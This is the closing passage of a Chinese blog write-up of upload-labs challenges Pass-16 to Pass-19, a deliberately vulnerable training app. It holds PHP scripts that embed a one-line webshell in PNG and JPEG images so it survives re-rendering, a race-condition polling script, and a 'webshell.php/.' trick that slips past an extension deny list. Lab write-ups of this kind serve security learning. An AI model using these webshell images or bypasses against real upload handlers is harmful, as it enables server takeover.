+<p>其中&#x2F;b代表二进制文件binary，放在图片后面，&#x2F;a代表文字文件ascii<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673795643512-aeb192d4-a2ef-4a48-8579-807ce70a5b7d.png" alt="62eaa9b1448ffa349f6023a08923ab5.png"><br>生成之后上传，测试连接，但是发现无法连接，把图片用文本形式打开后发现php语句格式前面有缺失（缺少了<code>&lt;</code>），所以在webshell文件前面随便加上一点字符。<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796220390-17042861-ee9a-49df-9b1f-081543b12e33.png" alt="image.png"><br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673796269910-ddbfd283-518b-4f3b-aa63-039cae915393.png" alt="image.png"><br>重新合成，发现这次格式不缺失了，但是这样传上去之后还是不行，查阅资料发现，<code>.jpg</code>文件和<code>.gif</code>不同，前者渲染的方式和后者渲染的方式不同，因此选择gif文件的操作难度更低。<br>相同步骤重新操作gif文件，合成之后上传，连接发现成功。</p>
+<h2 id="方法二-1"><a href="#方法二-1" class="headerlink" title="方法二"></a>方法二</h2><p>先上传一个png图片，得到二次渲染后的图片，用010编辑器打开，对比两个文件二进制编码：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807266042-10a77bfa-5273-4d5b-b77e-90108045a054.png" alt="image.png"><br>红色的是不同的，白色的是相同的，因此可以将一句话木马写在白色位置：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673807548864-217eebd6-c513-4f93-88ad-db8b78867018.png" alt="image.png"><br>然后上传连接</p>
+<h2 id="方法三（尝试）"><a href="#方法三（尝试）" class="headerlink" title="方法三（尝试）"></a>方法三（尝试）</h2><p>可以上传一png结尾的 jpg图片</p>
+<h2 id="png-jpg-图片马制作"><a href="#png-jpg-图片马制作" class="headerlink" title="png jpg 图片马制作"></a>png jpg 图片马制作</h2><p>如果想使用<code>.png</code>文件可以使用以下代码生成图片：（这个代码好像在php8版本会报错）</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+$p &#x3D; array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+
+
+
+$img &#x3D; imagecreatetruecolor(32, 32);
+
+for ($y &#x3D; 0; $y &lt; sizeof($p); $y +&#x3D; 3) &#123;
+   $r &#x3D; $p[$y];
+   $g &#x3D; $p[$y+1];
+   $b &#x3D; $p[$y+2];
+   $color &#x3D; imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y &#x2F; 3), 0, $color);
+&#125;
+
+imagepng($img,&#39;.&#x2F;1.png&#39;);
+?&gt;</code></pre>
+<p>生成之后得到的一句话木马为：</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?&#x3D;$_GET[0]($_POST[1]);?&gt;</code></pre>
+<p>可以如下使用：<br><img class="rounded-lg max-w-6/12 max-h-6/12 mt-2 mb-0" src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673872967604-c93e3422-8a31-4184-a1b5-35eae3f284e8.png" alt="image.png"><br>如果想使用<code>jpg</code>文件使用以下代码：（但是由于jpg文件容易损坏，因此可能需要多次生成）</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+    $miniPayload &#x3D; &quot;&lt;?&#x3D;phpinfo();?&gt;&quot;;
+
+
+    if(!extension_loaded(&#39;gd&#39;) || !function_exists(&#39;imagecreatefromjpeg&#39;)) &#123;
+        die(&#39;php-gd is not installed&#39;);
+    &#125;
+
+    if(!isset($argv[1])) &#123;
+        die(&#39;php jpg_payload.php &lt;jpg_name.jpg&gt;&#39;);
+    &#125;
+
+    set_error_handler(&quot;custom_error_handler&quot;);
+
+    for($pad &#x3D; 0; $pad &lt; 1024; $pad++) &#123;
+        $nullbytePayloadSize &#x3D; $pad;
+        $dis &#x3D; new DataInputStream($argv[1]);
+        $outStream &#x3D; file_get_contents($argv[1]);
+        $extraBytes &#x3D; 0;
+        $correctImage &#x3D; TRUE;
+
+        if($dis-&gt;readShort() !&#x3D; 0xFFD8) &#123;
+            die(&#39;Incorrect SOI marker&#39;);
+        &#125;
+
+        while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() &#x3D;&#x3D; 0xFF)) &#123;
+            $marker &#x3D; $dis-&gt;readByte();
+            $size &#x3D; $dis-&gt;readShort() - 2;
+            $dis-&gt;skip($size);
+            if($marker &#x3D;&#x3D;&#x3D; 0xDA) &#123;
+                $startPos &#x3D; $dis-&gt;seek();
+                $outStreamTmp &#x3D; 
+                    substr($outStream, 0, $startPos) . 
+                    $miniPayload . 
+                    str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
+                    substr($outStream, $startPos);
+                checkImage(&#39;_&#39;.$argv[1], $outStreamTmp, TRUE);
+                if($extraBytes !&#x3D;&#x3D; 0) &#123;
+                    while((!$dis-&gt;eof())) &#123;
+                        if($dis-&gt;readByte() &#x3D;&#x3D;&#x3D; 0xFF) &#123;
+                            if($dis-&gt;readByte !&#x3D;&#x3D; 0x00) &#123;
+                                break;
+                            &#125;
+                        &#125;
+                    &#125;
+                    $stopPos &#x3D; $dis-&gt;seek() - 2;
+                    $imageStreamSize &#x3D; $stopPos - $startPos;
+                    $outStream &#x3D; 
+                        substr($outStream, 0, $startPos) . 
+                        $miniPayload . 
+                        substr(
+                            str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
+                                substr($outStream, $startPos, $imageStreamSize),
+                            0,
+                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+                                substr($outStream, $stopPos);
+                &#125; elseif($correctImage) &#123;
+                    $outStream &#x3D; $outStreamTmp;
+                &#125; else &#123;
+                    break;
+                &#125;
+                if(checkImage(&#39;payload_&#39;.$argv[1], $outStream)) &#123;
+                    die(&#39;Success!&#39;);
+                &#125; else &#123;
+                    break;
+                &#125;
+            &#125;
+        &#125;
+    &#125;
+    unlink(&#39;payload_&#39;.$argv[1]);
+    die(&#39;Something\&#39;s wrong&#39;);
+
+    function checkImage($filename, $data, $unlink &#x3D; FALSE) &#123;
+        global $correctImage;
+        file_put_contents($filename, $data);
+        $correctImage &#x3D; TRUE;
+        imagecreatefromjpeg($filename);
+        if($unlink)
+            unlink($filename);
+        return $correctImage;
+    &#125;
+
+    function custom_error_handler($errno, $errstr, $errfile, $errline) &#123;
+        global $extraBytes, $correctImage;
+        $correctImage &#x3D; FALSE;
+        if(preg_match(&#39;&#x2F;(\d+) extraneous bytes before marker&#x2F;&#39;, $errstr, $m)) &#123;
+            if(isset($m[1])) &#123;
+                $extraBytes &#x3D; (int)$m[1];
+            &#125;
+        &#125;
+    &#125;
+
+    class DataInputStream &#123;
+        private $binData;
+        private $order;
+        private $size;
+
+        public function __construct($filename, $order &#x3D; false, $fromString &#x3D; false) &#123;
+            $this-&gt;binData &#x3D; &#39;&#39;;
+            $this-&gt;order &#x3D; $order;
+            if(!$fromString) &#123;
+                if(!file_exists($filename) || !is_file($filename))
+                    die(&#39;File not exists [&#39;.$filename.&#39;]&#39;);
+                $this-&gt;binData &#x3D; file_get_contents($filename);
+            &#125; else &#123;
+                $this-&gt;binData &#x3D; $filename;
+            &#125;
+            $this-&gt;size &#x3D; strlen($this-&gt;binData);
+        &#125;
+
+        public function seek() &#123;
+            return ($this-&gt;size - strlen($this-&gt;binData));
+        &#125;
+
+        public function skip($skip) &#123;
+            $this-&gt;binData &#x3D; substr($this-&gt;binData, $skip);
+        &#125;
+
+        public function readByte() &#123;
+            if($this-&gt;eof()) &#123;
+                die(&#39;End Of File&#39;);
+            &#125;
+            $byte &#x3D; substr($this-&gt;binData, 0, 1);
+            $this-&gt;binData &#x3D; substr($this-&gt;binData, 1);
+            return ord($byte);
+        &#125;
+
+        public function readShort() &#123;
+            if(strlen($this-&gt;binData) &lt; 2) &#123;
+                die(&#39;End Of File&#39;);
+            &#125;
+            $short &#x3D; substr($this-&gt;binData, 0, 2);
+            $this-&gt;binData &#x3D; substr($this-&gt;binData, 2);
+            if($this-&gt;order) &#123;
+                $short &#x3D; (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+            &#125; else &#123;
+                $short &#x3D; (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+            &#125;
+            return $short;
+        &#125;
+
+        public function eof() &#123;
+            return !$this-&gt;binData||(strlen($this-&gt;binData) &#x3D;&#x3D;&#x3D; 0);
+        &#125;
+    &#125;
+?&gt;</code></pre>
+<p>运行脚本命令：</p>
+<pre class="language-php" data-language="php"><code class="language-php">jpg_payload.php 1.jpg</code></pre>
+<h1 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+
+if(isset($_POST[&#39;submit&#39;]))&#123;
+    $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);
+    $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;];
+    $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
+    $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1);
+    $upload_file &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; . $file_name;
+
+    if(move_uploaded_file($temp_file, $upload_file))&#123;
+        if(in_array($file_ext,$ext_arr))&#123;
+             $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;
+             rename($upload_file, $img_path);
+             unlink($upload_file);
+             $is_upload &#x3D; true;
+        &#125;else&#123;
+            $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;
+            unlink($upload_file);
+        &#125;
+    &#125;else&#123;
+        $msg &#x3D; &#39;上传失败！&#39;;
+    &#125;
+&#125;</code></pre>
+<h2 id="方法一-1"><a href="#方法一-1" class="headerlink" title="方法一"></a>方法一</h2><p>这种过滤方法是条件筛选，先上传文件，如果不符合格式再将文件删除。所以可以在文件没被删除时访问即可，利用这个时间差执行，但是时间差很短，所以我们可以直接使用脚本访问。</p>
+<pre class="language-php" data-language="php"><code class="language-php">import requests
+url &#x3D; &quot;http:&#x2F;&#x2F;192.168.31.88&#x2F;upload-labs&#x2F;upload&#x2F;webshell.jpg&quot;
+while True:
+    html &#x3D; requests.get(url)
+    if html.status_code &#x3D;&#x3D; 200:
+        print(&quot;OK&quot;)
+        break</code></pre>
+<h2 id="方法二-2"><a href="#方法二-2" class="headerlink" title="方法二"></a>方法二</h2><p>将上传页面和文件包含触发漏洞页面发送到Burp的intruder，然后payload设置为null，即可触发条件竞争漏洞</p>
+<h1 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h1><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;index.php
+$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;]))
+&#123;
+    require_once(&quot;.&#x2F;myupload.php&quot;);
+    $imgFileName &#x3D;time();
+    $u &#x3D; new MyUpload($_FILES[&#39;upload_file&#39;][&#39;name&#39;], $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $_FILES[&#39;upload_file&#39;][&#39;size&#39;],$imgFileName);
+    $status_code &#x3D; $u-&gt;upload($UPLOAD_ADDR);
+    switch ($status_code) &#123;
+        case 1:
+            $is_upload &#x3D; true;
+            $img_path &#x3D; $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;
+            break;
+        case 2:
+            $msg &#x3D; &#39;文件已经被上传，但没有重命名。&#39;;
+            break; 
+        case -1:
+            $msg &#x3D; &#39;这个文件不能上传到服务器的临时文件存储目录。&#39;;
+            break; 
+        case -2:
+            $msg &#x3D; &#39;上传失败，上传目录不可写。&#39;;
+            break; 
+        case -3:
+            $msg &#x3D; &#39;上传失败，无法上传该类型文件。&#39;;
+            break; 
+        case -4:
+            $msg &#x3D; &#39;上传失败，上传的文件过大。&#39;;
+            break; 
+        case -5:
+            $msg &#x3D; &#39;上传失败，服务器已经存在相同名称文件。&#39;;
+            break; 
+        case -6:
+            $msg &#x3D; &#39;文件无法上传，文件不能复制到目标目录。&#39;;
+            break;      
+        default:
+            $msg &#x3D; &#39;未知错误！&#39;;
+            break;
+    &#125;
+&#125;
+
+&#x2F;&#x2F;myupload.php
+class MyUpload&#123;
+......
+......
+...... 
+  var $cls_arr_ext_accepted &#x3D; array(
+      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,
+      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );
+
+......
+......
+......  
+  &#x2F;** upload()
+   **
+   ** Method to upload the file.
+   ** This is the only method to call outside the class.
+   ** @para String name of directory we upload to
+   ** @returns void
+  **&#x2F;
+  function upload( $dir )&#123;
+    
+    $ret &#x3D; $this-&gt;isUploadedFile();
+    
+    if( $ret !&#x3D; 1 )&#123;
+      return $this-&gt;resultUpload( $ret );
+    &#125;
+
+    $ret &#x3D; $this-&gt;setDir( $dir );
+    if( $ret !&#x3D; 1 )&#123;
+      return $this-&gt;resultUpload( $ret );
+    &#125;
+
+    $ret &#x3D; $this-&gt;checkExtension();
+    if( $ret !&#x3D; 1 )&#123;
+      return $this-&gt;resultUpload( $ret );
+    &#125;
+
+    $ret &#x3D; $this-&gt;checkSize();
+    if( $ret !&#x3D; 1 )&#123;
+      return $this-&gt;resultUpload( $ret );    
+    &#125;
+    
+    &#x2F;&#x2F; if flag to check if the file exists is set to 1
+    
+    if( $this-&gt;cls_file_exists &#x3D;&#x3D; 1 )&#123;
+      
+      $ret &#x3D; $this-&gt;checkFileExists();
+      if( $ret !&#x3D; 1 )&#123;
+        return $this-&gt;resultUpload( $ret );    
+      &#125;
+    &#125;
+
+    &#x2F;&#x2F; if we are here, we are ready to move the file to destination
+
+    $ret &#x3D; $this-&gt;move();
+    if( $ret !&#x3D; 1 )&#123;
+      return $this-&gt;resultUpload( $ret );    
+    &#125;
+
+    &#x2F;&#x2F; check if we need to rename the file
+
+    if( $this-&gt;cls_rename_file &#x3D;&#x3D; 1 )&#123;
+      $ret &#x3D; $this-&gt;renameFile();
+      if( $ret !&#x3D; 1 )&#123;
+        return $this-&gt;resultUpload( $ret );    
+      &#125;
+    &#125;
+    
+    &#x2F;&#x2F; if we are here, everything worked as planned :)
+
+    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );
+  
+  &#125;
+......
+......
+...... 
+&#125;;
+</code></pre>
+<h2 id="方法一-2"><a href="#方法一-2" class="headerlink" title="方法一"></a>方法一</h2><p>直接上传图片马即可，可以在返回页面中得到图片名称</p>
+<h1 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h1><pre class="language-php" data-language="php"><code class="language-php">$is_upload &#x3D; false;
+$msg &#x3D; null;
+if (isset($_POST[&#39;submit&#39;])) &#123;
+    if (file_exists($UPLOAD_ADDR)) &#123;
+        $deny_ext &#x3D; array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);
+
+        $file_name &#x3D; $_POST[&#39;save_name&#39;];
+        $file_ext &#x3D; pathinfo($file_name,PATHINFO_EXTENSION);
+
+        if(!in_array($file_ext,$deny_ext)) &#123;
+            $img_path &#x3D; $UPLOAD_ADDR . &#39;&#x2F;&#39; .$file_name;
+            if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) &#123; 
+                $is_upload &#x3D; true;
+            &#125;else&#123;
+                $msg &#x3D; &#39;上传失败！&#39;;
+            &#125;
+        &#125;else&#123;
+            $msg &#x3D; &#39;禁止保存为该类型文件！&#39;;
+        &#125;
+
+    &#125; else &#123;
+        $msg &#x3D; $UPLOAD_ADDR . &#39;文件夹不存在,请手工创建！&#39;;
+    &#125;
+&#125;</code></pre>
+<h2 id="解法-14"><a href="#解法-14" class="headerlink" title="解法"></a>解法</h2><p><code>move_uploaded_file</code>这个函数会忽略<code>/</code>，因此可以修改上传的文件名为：<code>webshell.php/.</code>即可成功上传，测试连接成功。</p>
+
+                        </article>
+                    </div>
+
+
+                    <div class="fleet-content-body-footer">
+                        <!--翻页器-->
+                        <div class="flex-row flex w-full justify-between">
+                            <div class="fleet-content-body-footer-left">
+                                
+                                    <div><a href="/posts/ae9416d/"
+                                            class="btn btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M15.41,16.58L10.83,12L15.41,7.41L14,6L8,12L14,18L15.41,16.58Z"></path>
+                                            </svg>
+                                            <div class="flex flex-col items-start"><span
+                                                        class="text-base-content/50 hidden text-xs font-normal md:block">上一篇</span>
+                                                <span>web1-20信</span></div>
+                                        </a></div>
+                                
+                            </div>
+                            <div class="fleet-content-body-footer-right">
+                                
+                                    <div><a href="/posts/8e0b6517/"
+                                            class="btn btn-neutral btn-sm md:btn-md gap-2 lg:gap-3">
+                                            <div class="flex flex-col items-end"><span
+                                                        class="text-neutral-content/50 hidden text-xs font-normal md:block">下一篇</span>
+                                                <span>黄河流域公安院校网络空间安全技能挑战赛WP</span></div>
+                                            <svg class="h-6 w-6 fill-current md:h-8 md:w-8"
+                                                 xmlns="http://www.w3.org/2000/svg"
+                                                 width="24" height="24" viewBox="0 0 24 24">
+                                                <path d="M8.59,16.58L13.17,12L8.59,7.41L10,6L16,12L10,18L8.59,16.58Z"></path>
+                                            </svg>
+                                        </a></div>
+
+                                
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+</div>
+
+    <!--    嵌套位置结束-->
+
+
+
+
+
+    <!--<h3>categories</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/CTF/">-->
+    <!--                CTF-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/categories/Python/">-->
+    <!--                Python-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+
+    <!--<h3>tags</h3>-->
+    <!--<ul>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/WriteUp/">-->
+    <!--                WriteUp-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CISCN/">-->
+    <!--                CISCN-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/valorant/">-->
+    <!--                valorant-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/genshin/">-->
+    <!--                genshin-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Shortcut/">-->
+    <!--                Shortcut-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%AF%AD%E9%9B%80/">-->
+    <!--                语雀-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/%E8%84%9A%E6%9C%AC/">-->
+    <!--                脚本-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/CTFshow0-1/">-->
+    <!--                CTFshow0-1-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--        <li>-->
+    <!--            <a href="/tags/Tampermonkey/">-->
+    <!--                Tampermonkey-->
+    <!--            </a>-->
+    <!--        </li>-->
+    <!--    -->
+    <!--</ul>-->
+</div>
+<!--返回顶部按钮-->
+<button class="backToTopBtn btn" title="返回顶部">&#8593;</button>
+<!--加个渐变，但还是有点丑-->
+<!-- TODO 换个更好的方案-->
+<div class="h-1 bg-gradient-to-t from-base-content to-base-100">
+</div>
+
+<footer class="footer p-10 bg-neutral text-neutral-content">
+    <aside>
+        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
+        © 2020-2024 Lupas by Natro92
+        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
+    </aside>
+    <nav>
+        <header class="footer-title">Social</header>
+        <!--<div class="grid grid-flow-col gap-4">-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
+        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
+        <!--</div>-->
+    </nav>
+</footer>
+</body>
+
+</html>
+
+
